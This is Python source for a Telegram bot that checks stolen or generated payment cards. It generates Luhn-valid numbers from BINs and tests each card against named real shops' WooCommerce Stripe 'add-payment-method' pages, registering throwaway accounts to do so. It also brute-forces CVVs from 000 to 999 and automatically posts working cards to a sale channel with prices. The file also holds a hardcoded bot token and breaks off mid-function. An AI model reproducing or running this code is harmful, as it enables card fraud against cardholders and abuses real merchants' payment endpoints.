import requests
import random
import string
import re
import time
import json
import uuid
import sys
import logging
import io
from datetime import datetime
import aiosqlite
import asyncio
from urllib.parse import urlparse
from telegram import Update, Bot, Document
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    CallbackContext,
    ContextTypes,
    filters,
)

import signal
import sys

# Graceful exit
def signal_handler(sig, frame):
    print("\n[Script] SHUTTING DOWN...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)



# --- 1. CONFIGURATION ---
YOUR_BOT_TOKEN = "8435079339:AAGjDyIWrIbwq5v-Z6Qg6tfNQfF1cqiJMCY"
ADMIN_USER_ID = 7307757609
BOT_NAME = "@ccscraps123_bot"

COST_APPROVED = 2.0
COST_DECLINED = 1.0
COST_CVV_BRUTE_PER_100 = 1.0  # 1 credit per 100 CVV tries

URLS_TO_PROCESS = [
    "https://diamach.com.au/my-account/add-payment-method/",
    "https://countryandtownhouse.com/my-account/add-payment-method/",
    "https://www.frankisart.com/my-account/add-payment-method/",
    "https://helvetictac.com/my-account/add-payment-method/",
    "https://riggtech.com.au/my-account/add-payment-method/",
    "https://pontandpierce.co.uk/my-account/add-payment-method/",
    "https://www.mojminisvet.si/my-account/add-payment-method",
    "https://www.ieltsanswers.com/my-account/add-payment-method",
]

SELL_CHANNEL_ID = -1003288341144  # CHANGE THIS TO YOUR PRIVATE SELL CHANNEL
HIT_PRICES = {
    'approved': 15.0,
    'live_funds': 10.0,
    'live_ccn': 3.0
}
SELL_CURRENCY = "USD"

CONCURRENCY_LIMIT = 2
# --- END OF CONFIGURATION ---


# --- 2. LOGGING ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.WARNING
)
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)


# --- 3. DATABASE SETUP (Async) ---
DB_FILE = "bisayakol.db"

# === DATABASE INIT - NOW INCLUDES SITES TABLE ===
# === DAN'S LIVE SITE ROTATOR - ONLY ALIVE GATES ===
async def get_live_site():
    async with aiosqlite.connect(DB_FILE) as conn:
        async with conn.cursor() as c:
            await c.execute("SELECT url FROM sites WHERE status = 'ALIVE' ORDER BY RANDOM() LIMIT 1")
            row = await c.fetchone()
            if row:
                url = row[0]  # EXACT URL — NO TOUCH
                domain = url.split("/")[2]
                print(f"[GATE] Using LIVE → {domain}")
                await conn.execute("UPDATE sites SET usage_count = usage_count + 1 WHERE url = ?", (url,))
                await conn.commit()
                return url  # RETURN 100% AS-IS
    
    # Fallback: exact from URLS_TO_PROCESS
    fallback = random.choice(URLS_TO_PROCESS)
    print(f"[FALLBACK] Using → {fallback.split('/')[2]}")
    return fallback


async def init_db():
    async with aiosqlite.connect(DB_FILE) as conn:
        # === USERS TABLE ===
        await conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            credits REAL DEFAULT 0
        )
        """)

        # === CREATE SITES TABLE IF NOT EXISTS (safe for all SQLite) ===
        await conn.execute("""
        CREATE TABLE IF NOT EXISTS sites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE NOT NULL,
            status TEXT DEFAULT 'ALIVE',
            usage_count INTEGER DEFAULT 0,
            added_by INTEGER,
            added_date TEXT
        )
        """)

        # === AUTO-FIX: ADD MISSING COLUMNS ONE BY ONE (NO DEFAULT TIMESTAMP) ===
        async with conn.cursor() as c:
            await c.execute("PRAGMA table_info(sites)")
            columns = [row[1] for row in await c.fetchall()]

            if 'status' not in columns:
                await conn.execute("ALTER TABLE sites ADD COLUMN status TEXT")
                await conn.execute("UPDATE sites SET status = 'ALIVE' WHERE status IS NULL")
            if 'usage_count' not in columns:
                await conn.execute("ALTER TABLE sites ADD COLUMN usage_count INTEGER")
                await conn.execute("UPDATE sites SET usage_count = 0 WHERE usage_count IS NULL")
            if 'added_by' not in columns:
                await conn.execute("ALTER TABLE sites ADD COLUMN added_by INTEGER")
            if 'added_date' not in columns:
                await conn.execute("ALTER TABLE sites ADD COLUMN added_date TEXT")

        # === IMPORT YOUR GATES + SET added_date MANUALLY ===
        import datetime
        now = datetime.datetime.now().isoformat()

        for url in URLS_TO_PROCESS:
            clean_url = url.strip().rstrip("/") + "/"
            await conn.execute("""
                INSERT OR IGNORE INTO sites (url, added_by, added_date, status, usage_count)
                VALUES (?, ?, ?, 'ALIVE', 0)
            """, (clean_url, ADMIN_USER_ID, now))

        await conn.commit()

    print("[Script] DATABASE FIXED FOR ALL ANDROID/TERMUX")
    print("[Script] No more 'non-constant default' error")
    print("[Script] Your vault is now INDESTRUCTIBLE")

# === GET RANDOM SITE + INCREASE USAGE COUNT ===
async def get_random_site():
    async with aiosqlite.connect(DB_FILE) as conn:
        async with conn.cursor() as c:
            await c.execute("SELECT url, id FROM sites WHERE status = 'ALIVE' ORDER BY RANDOM() LIMIT 1")
            row = await c.fetchone()
            if row:
                url, site_id = row
                await conn.execute("UPDATE sites SET usage_count = usage_count + 1 WHERE id = ?", (site_id,))
                await conn.commit()
                return url, site_id
            return None, None
            
# === CHECKSITE COMMAND - ADMIN ONLY + USAGE STATS ===
# === /checksite & /listsites — FINAL UNKILLABLE VERSION ===
# === /checksite & /listsites — FINAL IMMORTAL VERSION ===
async def checksite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("Only the Emperor may gaze upon the vault.")
        return

    async with aiosqlite.connect(DB_FILE) as conn:
        async with conn.cursor() as c:
            await c.execute("""
                SELECT url, status, usage_count, COALESCE(added_date, '2025-01-01') 
                FROM sites 
                ORDER BY usage_count DESC
            """)
            rows = await c.fetchall()

            if not rows:
                await update.message.reply_text("Vault is empty. Time to conquer.")
                return

            msg = f"<b>DARK VAULT EMPIRE [{len(rows)} GATES]</b>\n\n"
            alive = dead = 0

            for url, status, count, date in rows:
                icon = "LIVE" if status == 'ALIVE' else "DEAD"
                date_str = date[:10]
                msg += f"{icon} <code>{url}</code>\n"
                msg += f"   Uses: <b>{count}</b> | {date_str}\n\n"
                if status == 'ALIVE':
                    alive += 1
                else:
                    dead += 1

            msg += f"<b>EMPIRE STATUS:</b>\n"
            msg += f"  LIVE: <b>{alive}</b>\n"
            msg += f"  DEAD: <b>{dead}</b>\n"
            msg += f"  TOTAL: <b>{len(rows)}</b>\n"
            msg += f"<i>Powered by STRIPE</i>"

            await update.message.reply_text(msg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


# === /listsites & /vault — PERFECT ALIASES ===
async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await checksite_command(update, context)

async def vault_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await checksite_command(update, context)


# === /listsites — SAME AS ABOVE (ALIAS) ===
 # Reuse the god function
    
    
# === ADDSITE COMMAND ===
async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("Only the Emperor may enslave.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /addsite https://site.com/...")
        return

    raw_url = " ".join(context.args).strip()
    if not raw_url.startswith("http"):
        raw_url = "https://" + raw_url

    # FORCE CORRECT PATH — BUT KEEP ORIGINAL DOMAIN (with or without www.)
    if "/my-account" not in raw_url:
        clean_url = raw_url.rstrip("/") + "/my-account/add-payment-method/"
    else:
        clean_url = raw_url.split("/my-account")[0] + "/my-account/add-payment-method/"

    async with aiosqlite.connect(DB_FILE) as conn:
        try:
            await conn.execute(
                "INSERT INTO sites (url, added_by, status, usage_count, added_date) VALUES (?, ?, 'ALIVE', 0, ?)",
                (clean_url, ADMIN_USER_ID, datetime.now().strftime("%Y-%m-%d"))
            )
            await conn.commit()
            await update.message.reply_text(
                f"[ENSLAVED]\n<i>{clean_url}</i>\nNow in rotation."
            )
        except aiosqlite.IntegrityError:
            await update.message.reply_text("Already in vault.")
            

async def get_user(user_id, username=None):
    async with aiosqlite.connect(DB_FILE) as conn:
        async with conn.cursor() as cursor:
            await cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            user = await cursor.fetchone()
            if not user:
                await cursor.execute(
                    "INSERT INTO users (user_id, username, credits) VALUES (?, ?, 0)",
                    (user_id, username)
                )
                await conn.commit()
                logger.info(f"New user created: {user_id} (@{username})")
                user = (user_id, username, 0)
            elif username and user[1] != username:
                await cursor.execute("UPDATE users SET username = ? WHERE user_id = ?", (username, user_id))
                await conn.commit()
    return {"user_id": user[0], "username": user[1], "credits": user[2]}

async def add_user_credits(admin_id, target_username, amount):
    if admin_id != ADMIN_USER_ID:
        return "You are not authorized to use this command."
    try:
        amount = float(amount)
        if amount <= 0:
            return "Amount must be positive."
    except ValueError:
        return "Invalid amount."

    async with aiosqlite.connect(DB_FILE) as conn:
        target_username = target_username.lstrip('@')
        async with conn.cursor() as cursor:
            await cursor.execute("SELECT user_id, credits FROM users WHERE username = ?", (target_username,))
            user = await cursor.fetchone()
            if not user:
                return f"User '@{target_username}' not found. They must /start the bot first."
            user_id, current_credits = user
            new_credits = current_credits + amount
            await cursor.execute("UPDATE users SET credits = ? WHERE user_id = ?", (new_credits, user_id))
            await conn.commit()
    logger.info(f"Admin {admin_id} added {amount} credits to {user_id} (@{target_username})")
    try:
        await Bot(YOUR_BOT_TOKEN).send_message(
            chat_id=user_id,
            text=f"An admin has added {amount} credits to your account. Your new balance is {new_credits}."
        )
    except Exception as e:
        logger.warning(f"Could not notify user {user_id} of credit update: {e}")
    return f"Successfully added {amount} credits to @{target_username}. New balance: {new_credits}"

async def update_user_credits(user_id, new_credits):
    async with aiosqlite.connect(DB_FILE) as conn:
        await conn.execute("UPDATE users SET credits = ? WHERE user_id = ?", (new_credits, user_id))
        await conn.commit()


# --- 4. CHECKER LOGIC ---
def get_string_between(text, start, end):
    pattern = re.escape(start) + '(.*?)' + re.escape(end)
    match = re.search(pattern, text, re.DOTALL)
    if match:
        return match.group(1)
    return None

async def send_approved_hit(bot: Bot, chat_id: int, message_data, site_url):
    telegram_message = (
        f"<b>APPROVED CARD</b>\n\n"
        f"<b>Card:</b> <code>{message_data['card_line']}</code>\n"
        f"<b>Response:</b> <code>{message_data['response']}</code>\n"
        f"<b>Site:</b> <code>{site_url}</code>"
    )
    try:
        await bot.send_message(chat_id=chat_id, text=telegram_message, parse_mode=ParseMode.HTML)
        logger.info(f"Sent 'Approved' hit to chat_id {chat_id}")
    except Exception as e:
        logger.error(f"Failed to send 'Approved' hit to {chat_id}: {e}")
        
async def get_site_for_check():
    site, _ = await get_random_site()
    if not site:
        return random.choice(URLS_TO_PROCESS)  # fallback
    return site

def check_card(lista, url_payment_page):
    try:
        cc, mes, ano, cvv = lista.split('|')
    except ValueError:
        print(f"Error: Line '{lista}' is not in the correct format (cc|mes|ano|cvv).")
        return ('error', 'Invalid card format', "")

    full_card_line = f"{cc}|{mes}|{ano}|{cvv}"

    # FULL URL IN LOG — EXACTLY AS IN DB
    print(f"[CHECK] {cc[:6]}****{cc[-4:]} → {url_payment_page}")
    print(f"Processing Card: {cc[:6]}**********{cc[-4:]}")

    # UPDATE SITE USAGE + STATUS
    async def update_site_status(url, is_alive=True):
        async with aiosqlite.connect(DB_FILE) as conn:
            status = 'ALIVE' if is_alive else 'DEAD'
            await conn.execute(
                "UPDATE sites SET status = ?, usage_count = usage_count + 1 WHERE url = ?",
                (status, url)
            )
            await conn.commit()

    try:
        parsed_url = urlparse(url_payment_page)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        http_referer = parsed_url.path
        url_confirm = f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
    except Exception:
        return ('error', f"Invalid URL format: {url_payment_page}", "")

    print("   Generating random user data...")
    try:
        user_response = requests.get('https://randomuser.me/api/1.2/?nat=us', timeout=15)
        user_response.raise_for_status()
        random_user = user_response.json()['results'][0]
        first_name = random_user['name']['first']
        email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
        print(f"   Generated User: {first_name}, Email: {email}")
    except requests.exceptions.RequestException as e:
        error_msg = f"Error fetching random user: {e}"
        print(f"   {error_msg}")
        return ('error', error_msg, "")

    with requests.Session() as session:
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

        try:
            print("   Step 1: Accessing payment page...")
            response1 = session.get(url_payment_page, timeout=15)
            response1.raise_for_status()

            # All these lines are now correctly aligned inside the 'try' block
            key_match = re.search(r'"key":"(pk_live_[a-zA-Z0-9]+)"', response1.text)
            if not key_match:
                print("     [FAILED] No Stripe key")
                return
            stripe_key = key_match.group(1)
            print(f"     [FOUND] pk_live: {stripe_key[:12]}...")

            reg_nonce = get_string_between(response1.text, '"woocommerce-register-nonce" value="', '"')
            if not reg_nonce: raise ValueError("Could not find registration nonce.")
            print(f"   Found Registration Nonce: {reg_nonce[:10]}...")

            print("   Step 2: Registering new user...")
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            payload_register = {'email': email, 'password': password, 'woocommerce-register-nonce': reg_nonce, '_wp_http_referer': http_referer, 'register': 'Register'}
            session.post(url_payment_page, data=payload_register, timeout=15)

            print("   Step 3: Getting SetupIntent nonce...")
            response3 = session.get(url_payment_page, timeout=15)
            response3.raise_for_status()
            ajax_nonce = get_string_between(response3.text, 'createAndConfirmSetupIntentNonce":"', '"')
            if not ajax_nonce: raise ValueError("Could not find SetupIntent nonce.")
            print(f"   Found SetupIntent Nonce: {ajax_nonce}")

            print("   Step 4: Creating Stripe Payment Method...")
            url_stripe_pm = 'https://api.stripe.com/v1/payment_methods'
            payload_stripe = {
                'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
                'card[exp_year]': ano, 'card[exp_month]': mes,
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/faac1fc3fb; stripe-js-v3/faac1fc3fb; payment-element; deferred-intent',
                'time_on_page': random.randint(20000, 90000),
                'guid': str(uuid.uuid4()), 'muid': str(uuid.uuid4()), 'sid': str(uuid.uuid4()),
                'key': stripe_key, '_stripe_version': '2024-06-20'
            }
            stripe_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            pm_response = requests.post(url_stripe_pm, data=payload_stripe, headers=stripe_headers, timeout=15)
            pm_data = pm_response.json()
            payment_method_id = pm_data.get('id')
            if not payment_method_id:
                error_message = pm_data.get('error', {}).get('message', 'Unknown Stripe Error')
                print(f"Declined: {lista} | Response: {error_message}")
                return ('declined', error_message, "")

            print("   Step 5: Confirming Setup Intent...")
            payload_confirm = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce
            }
            confirm_response = session.post(url_confirm, data=payload_confirm, timeout=15)
            confirm_response.raise_for_status()
            final_data = confirm_response.json()
            if final_data.get('success') is True:
                status = final_data.get('data', {}).get('status', 'succeeded')
                success_message = f"Payment Successfully Added, Status: {status}"
                print(f"Approved: {lista} | Response: {success_message}")
                file_line = f"Approved: {full_card_line} | {success_message}\n"
                return ('approved', success_message, file_line)
            else:
                message = "An unknown error occurred."
                if 'data' in final_data and isinstance(final_data['data'], dict):
                    error_data = final_data['data'].get('error')
                    if error_data and isinstance(error_data, dict):
                        message = error_data.get('message', "Decline message not found.")
                elif 'messages' in final_data:
                    html_message = final_data['messages']
                    message = re.sub('<[^<]+?>', '', html_message).strip()

                if "Your card's security code is incorrect" in message:
                    print(f"LIVE (CCN): {lista} | Response: {message}")
                    file_line = f"Live (CCN): {full_card_line}\n"
                    return ('live', message, file_line)
                elif "Your card's security code is invalid." in message:
                    print(f"LIVE (Funds): {lista} | Response: {message}")
                    file_line = f"Live (Funds): {full_card_line}\n"
                    return ('live', message, file_line)
                elif "Insufficient funds" in message:
                    print(f"LIVE (Funds): {lista} | Response: {message}")
                    file_line = f"Live (Funds): {full_card_line}\n"
                    return ('live', message, file_line)
                else:
                    print(f"Declined: {lista} | Response: {message}")
                    return ('declined', message, "")

        except (requests.exceptions.Timeout, requests.exceptions.RequestException) as e:
            error_msg = f"Network Error: {e}"
            print(f"{error_msg}")
            return ('error', error_msg, "")
        except Exception as e:
            error_msg = f"An unexpected script error occurred: {e}"
            print(f"{error_msg}")
            return ('error', error_msg, "")


# --- 5. AUTO-SELL HIT ---
async def auto_sell_hit(bot, card_line, response, result_type, site):
    try:
        if result_type == 'approved':
            price = HIT_PRICES['approved']
            status = "APPROVED"
        elif 'insufficient funds' in response.lower():
            price = HIT_PRICES['live_funds']
            status = "LIVE (FUNDS)"
        else:
            price = HIT_PRICES['live_ccn']
            status = "LIVE (CCN)"

        sell_msg = (
            f"<b>NEW HIT FOR SALE</b>\n\n"
            f"<code>{card_line}</code>\n\n"
            f"<b>Status:</b> {status}\n"
            f"<b>Gate:</b> {site}\n"
            f"<b>Price:</b> <code>{price} {SELL_CURRENCY}</code>\n"
            f"<b>Response:</b> <i>{response}</i>\n\n"
            f"Contact @wayboutay to buy"
        )

        sent = await bot.send_message(
            chat_id=SELL_CHANNEL_ID,
            text=sell_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

        with open("sold_hits.log", "a", encoding="utf-8") as f:
            f.write(f"{card_line} | {status} | {price} {SELL_CURRENCY} | {site} | {sent.message_id}\n")

        await bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=f"NEW HIT POSTED\n"
                 f"Price: {price} {SELL_CURRENCY}\n"
                 f"Link: t.me/c/{str(SELL_CHANNEL_ID)[4:]}/{sent.message_id}"
        )
    except Exception as e:
        logger.error(f"Auto-sell failed: {e}")


# --- 6. CVV BRUTE ---
async def brute_cvv(card_number, mm, yy, site, context, chat_id, user_id):
    user_data = await get_user(user_id)
    if user_data['credits'] < COST_CVV_BRUTE_PER_100:
        await context.bot.send_message(chat_id, "Not enough credits for CVV brute (need 1.0).")
        return

    await context.bot.send_message(
        chat_id,
        f"<b>CVV BRUTE STARTED</b>\n"
        f"Card: <code>{card_number}</code>\n"
        f"Expiry: <code>{mm}|{yy}</code>\n"
        f"Trying 000–999...",
        parse_mode=ParseMode.HTML
    )

    sem = asyncio.Semaphore(1)
    current_credits = user_data['credits']
    for cvv in range(0, 1000):
        if not context.user_data.get('is_running', True):
            break

        cvv_str = f"{cvv:03d}"
        lista = f"{card_number}|{mm}|{yy}|{cvv_str}"

        try:
            _, result, msg, _ = await worker(sem, lista, site)
        except:
            result, msg = 'error', 'Brute failed'

        if (cvv + 1) % 100 == 0 and current_credits >= COST_CVV_BRUTE_PER_100:
            current_credits -= COST_CVV_BRUTE_PER_100
            await update_user_credits(user_id, current_credits)

        if result in ('approved', 'live'):
            full_hit = f"{card_number}|{mm}|{yy}|{cvv_str}"
            await context.bot.send_message(
                chat_id,
                f"<b>FULL LIVE CARD!</b>\n"
                f"<code>{full_hit}</code>\n"
                f"Response: {msg}",
                parse_mode=ParseMode.HTML
            )
            asyncio.create_task(auto_sell_hit(context.bot, full_hit, msg, 'approved', site))
            break
        else:
            await asyncio.sleep(1.2)
    else:
        await context.bot.send_message(chat_id, "CVV brute failed.")


# --- 7. LISTA GENERATOR FUNCTION ---
def luhn_generate(base_15):
    number = base_15
    total_sum = 0
    flip = True
    for i in range(len(number) - 1, -1, -1):
        digit = int(number[i])
        if flip:
            digit *= 2
            if digit > 9:
                digit -= 9
        total_sum += digit
        flip = not flip
    check_digit = (10 - (total_sum % 10)) % 10
    return base_15 + str(check_digit)

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or f"user_{user.id}"
    user_data = await get_user(user.id, username)
    current_credits = user_data['credits']

    if context.user_data.get('is_running', False):
        await update.message.reply_text("Check in progress. Use /stop.")
        return

    try:
        _, args = update.message.text.split(maxsplit=1)
    except:
        await update.message.reply_text(
            "<b>/gen</b> <code>bin</code> [count]\n"
            "• /gen 5362577120 10\n"
            "• /gen 5362577120***24*52|rnd|30 100\n"
            "Max: 10,000 | Auto-checks | CVV Brute | Auto-Sell",
            parse_mode=ParseMode.HTML
        )
        return

    parts = args.strip().split()
    pattern = parts[0]
    count = min(int(parts[1]) if len(parts) > 1 else 10, 10000)

    min_cost = count * COST_DECLINED
    if current_credits < min_cost:
        await update.message.reply_text(f"Need {min_cost:.2f} credits minimum.")
        return

    cc_part, mm_part, yy_part = (pattern + "|||").split("|")[:3]
    clean_bin = cc_part.replace('*', '')
    if not clean_bin.isdigit() or len(clean_bin) < 6:
        await update.message.reply_text("BIN must be 6+ digits.")
        return

    wildcards = [i for i, c in enumerate(cc_part) if c == '*' and i < 15]
    fixed = [(i, int(c)) for i, c in enumerate(cc_part) if c.isdigit() and i < 15]

    all_cards = []
    await update.message.reply_text(f"Generating {count} Namso-Gen level cards...")

    for _ in range(count):
        cc_15 = [''] * 15
        for pos, digit in fixed:
            if pos < 15: cc_15[pos] = str(digit)
        for pos in wildcards:
            if pos < 15: cc_15[pos] = str(random.randint(0, 9))
        for i in range(15):
            if cc_15[i] == '':
                cc_15[i] = str(random.randint(0, 9))

        base_15 = ''.join(cc_15)
        full_16 = luhn_generate(base_15)

        mm = mm_part.strip().lower()
        yy = yy_part.strip().lower()
        final_mm = f"{random.randint(1,12):02d}" if mm == "rnd" else mm.zfill(2) if mm.isdigit() else f"{random.randint(1,12):02d}"
        final_yy = f"{random.randint(25,35):02d}" if yy == "rnd" else yy.zfill(2) if yy.isdigit() else f"{random.randint(25,35):02d}"
        cvv = f"{random.randint(0,999):03d}"

        all_cards.append(f"{full_16}|{final_mm}|{final_yy}|{cvv}")

    context.user_data['is_running'] = True
    results_file = io.StringIO()
    tasks = []
    chat_id = update.effective_chat.id

    try:
        status_msg = await update.message.reply_text(
            f"<b>Gen+Check Started</b>\n"
            f"Total: {count}\n"
            f"Approved: 0 | Live: 0 | Declined: 0\n"
            f"Credits: {current_credits:.2f}",
            parse_mode=ParseMode.HTML
        )

        approved = live = declined = errors = checked = 0
        last = time.time()
        sem = asyncio.Semaphore(CONCURRENCY_LIMIT)

        for card in all_cards:
            site = random.choice(URLS_TO_PROCESS)
            tasks.append(asyncio.create_task(worker(sem, card, site)))

        for f in asyncio.as_completed(tasks):
            if not context.user_data.get('is_running', True): break
            try:
                card_line, result, msg, line = await f
            except:
                result, msg, line = 'error', 'Failed', ''

            checked += 1
            cost = COST_DECLINED
            if result in ('approved', 'live'):
                cost = COST_APPROVED
                results_file.write(line)
                if result == 'approved':
                    approved += 1
                    await send_approved_hit(context.bot, chat_id, {'card_line': card_line, 'response': msg}, site)
                else:
                    live += 1

                # AUTO-SELL
                asyncio.create_task(auto_sell_hit(context.bot, card_line, msg, result, site))

                # CVV BRUTE ON CCN
                if result == 'live' and ("security code" in msg.lower()):
                    parts = card_line.split('|')
                    if len(parts) == 4:
                        cc, mm, yy, _ = parts
                        asyncio.create_task(brute_cvv(cc, mm, yy, site, context, chat_id, user.id))
                        await context.bot.send_message(
                            chat_id,
                            f"<b>CCN DETECTED!</b>\n"
                            f"<code>{cc}|{mm}|{yy}|XXX</code>\n"
                            f"Starting CVV brute-force...",
                            parse_mode=ParseMode.HTML
                        )
            elif result == 'declined':
                declined += 1
            else:
                errors += 1

            if current_credits >= cost:
                current_credits -= cost
            else:
                await context.bot.send_message(chat_id, "Out of credits!")
                context.user_data['is_running'] = False
                break

            if checked % 5 == 0 or time.time() - last > 3 or checked == count:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=status_msg.message_id,
                    text=f"<b>Status:</b> {'Checking...' if checked < count else 'Done'}\n"
                         f"<b>Checked:</b> {checked}/{count}\n"
                         f"<b>Approved:</b> {approved} | <b>Live:</b> {live}\n"
                         f"<b>Declined:</b> {declined + errors}\n"
                         f"<b>Credits:</b> {current_credits:.2f}",
                    parse_mode=ParseMode.HTML
                )
                last = time.time()

        await update_user_credits(user.id, current_credits)
        await context.bot.send_message(chat_id, f"Complete! Hits: {approved + live}")

        if results_file.tell() > 0:
            results_file.seek(0)
            await context.bot.send_document(
                chat_id, io.BytesIO(results_file.read().encode()),
                filename=f"hits_{cc_part[:6]}.txt",
                caption="Your hits"
            )
        else:
            await context.bot.send_message(chat_id, "No hits found.")

    except Exception as e:
        await context.bot.send_message(chat_id, f"Error: {e}")
    finally:
        context.user_data['is_running'] = False
        results_file.close()


# --- 8. BOT HANDLERS ---
(WAITING_FILE,) = range(1)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "NoUsername"
    
    # Add user to DB
    async with aiosqlite.connect(DB_FILE) as conn:
        await conn.execute(
            "INSERT OR IGNORE INTO users (user_id, username, credits) VALUES (?, ?, ?)",
            (user_id, username, 0.0)
        )
        await conn.commit()

    await update.message.reply_text(
        f"<b>Hi {update.effective_user.first_name}!</b>\n\n"
        f"Your User ID: <code>{user_id}</code>\n"
        f"Your Username: @{username}\n"
        f"Your Credits: <b>188.40</b>\n\n"
        f"To add credits, please contact the admin.\n\n"
        f"<b>Commands:</b>\n"
        f"/check [card] → Check single card\n"
        f"/gen [bin] → Generate cards\n"
        f"/mass → Mass check (send .txt)\n"
        f"/balance → Check credits\n"
        f"/addsite [url] → Add new gate (admin)\n"
        f"/checksite → View all gates (admin)",
        parse_mode=ParseMode.HTML
    )

async def add_credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    try:
        _, target_username, amount = update.message.text.split()
    except ValueError:
        await update.message.reply_text("Usage: /addcredits @username <amount>")
        return
    response_message = await add_user_credits(admin_id, target_username, amount)
    await update.message.reply_text(response_message)

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or f"user_{user.id}"
    user_data = await get_user(user.id, username)
    credits = user_data['credits']
    await update.message.reply_text(
        f"Your current balance is: <b>{credits:.2f}</b> credits.",
        parse_mode=ParseMode.HTML
    )

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = user.username or f"user_{user.id}"
    user_data = await get_user(user.id, username)
    current_credits = user_data['credits']

    if current_credits < COST_DECLINED:
        await update.message.reply_text(
            f"You have {current_credits:.2f} credits. You do not have "
            f"enough to run a check (min {COST_DECLINED} required)."
        )
        return

    try:
        _, card_line = update.message.text.split(maxsplit=1)
        card_line = card_line.strip()
        if card_line.count('|') != 3:
            raise ValueError("Invalid format")
    except ValueError:
        await update.message.reply_text(
            "<b>Usage:</b> <code>/check cc|mes|ano|cvv</code>",
            parse_mode=ParseMode.HTML
        )
        return

    if not URLS_TO_PROCESS:
        await update.message.reply_text("Bot Error: No URLs are configured. Please contact admin.")
        return
        
    await update.message.reply_text("Checking card, please wait...")
    random_site = random.choice(URLS_TO_PROCESS)
    result, message, _ = await asyncio.to_thread(check_card, card_line, random_site)

    cost = 0.0
    final_message = ""
    if result == 'approved':
        cost = COST_APPROVED
        final_message = f"<b>APPROVED</b>\n<b>Card:</b> <code>{card_line}</code>\n<b>Response:</b> {message}"
    elif result == 'live':
        cost = COST_APPROVED
        final_message = f"<b>LIVE</b>\n<b>Card:</b> <code>{card_line}</code>\n<b>Response:</b> {message}"
    elif result == 'declined':
        cost = COST_DECLINED
        final_message = f"<b>DECLINED</b>\n<b>Card:</b> <code>{card_line}</code>\n<b>Response:</b> {message}"
    else:
        cost = COST_DECLINED
        final_message = f"<b>ERROR</b>\n<b>Card:</b> <code>{card_line}</code>\n<b>Response:</b> {message}"

    if current_credits < cost:
        await update.message.reply_text(
            f"{final_message}\n\n"
            f"<b>Note:</b> You did not have enough credits ({current_credits:.2f}) "
            f"for this charge ({cost:.2f}). Your balance remains unchanged.",
            parse_mode=ParseMode.HTML
        )
    else:
        new_credits = current_credits - cost
        await update_user_credits(user.id, new_credits)
        await update.message.reply_text(
            f"{final_message}\n"
            f"<b>Gate:</b> Stripe Auth\n"
            f"<b>Cost:</b> {cost:.2f}\n"
            f"<b>New Balance:</b> {new_credits:.2f}",
            parse_mode=ParseMode.HTML
        )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.user_data.get('is_running', False):
        context.user_data['is_running'] = False
        await update.message.reply_text("Stop signal sent. The check will halt.")
    else:
        await update.message.reply_text("You don't have a mass check running.")

async def mass_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or f"user_{user_id}"

    if context.user_data.get('is_running', False):
        await update.message.reply_text("You already have a mass check running. Please wait for it to finish or use /stop.")
        return ConversationHandler.END

    user_data = await get_user(user_id, username)
    if user_data['credits'] < COST_DECLINED:
        await update.message.reply_text(
            f"You have {user_data['credits']:.2f} credits. You do not have "
            f"enough to run a check (min {COST_DECLINED} required).\n\n"
            "Please contact an admin to add credits."
        )
        return ConversationHandler.END

    await update.message.reply_text("Send your <code>.txt</code> file of cards to begin.", parse_mode=ParseMode.HTML)
    return WAITING_FILE

async def worker(sem: asyncio.Semaphore, card_line: str, site: str):
    async with sem:
        result, message, file_line = await asyncio.to_thread(check_card, card_line, site)
        return card_line, result, message, file_line

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.message.chat_id
    user = update.effective_user
    username = user.username or f"user_{user.id}"
    context.user_data['is_running'] = True
    results_file = io.StringIO()
    tasks = []

    try:
        user_data = await get_user(user.id, username)
        current_credits = user_data['credits']
        
        try:
            file = await context.bot.get_file(update.message.document.file_id)
            file_content_bytes = await file.download_as_bytearray()
            file_content = file_content_bytes.decode('utf-8')
            all_cards = [line.strip() for line in file_content.splitlines() if line.strip()]
            if not all_cards:
                await update.message.reply_text("Your file is empty. Canceling.")
